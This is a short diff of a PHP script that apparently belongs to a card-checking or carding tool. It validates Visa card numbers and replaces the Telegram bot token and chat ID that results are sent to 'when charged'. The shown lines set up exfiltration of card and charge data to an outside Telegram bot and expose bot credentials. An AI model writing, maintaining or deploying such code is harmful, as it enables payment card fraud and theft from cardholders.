@@ -481,8 +481,8 @@ if (preg_match('/^4[0-9]{12}(?:[0-9]{3})?$/', $cc)) {
 
 #############SET DESTINATION OF YOUR TG BOT
 $domain = $_SERVER['HTTP_HOST']; // give you the full URL of the current page that's being accessed
-$botToken = urlencode('5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw');
-$chatID = urlencode('-1001815647781');
+$botToken = urlencode('6240489572:AAGv7ZDZkFZfovSm5l9u1iB2KFuTBTvIT8k');
+$chatID = urlencode('-1001681796656');
 $amttt = intval($amttt)/100;
 
 #############SEND TO TG BOT WHEN CHARGED
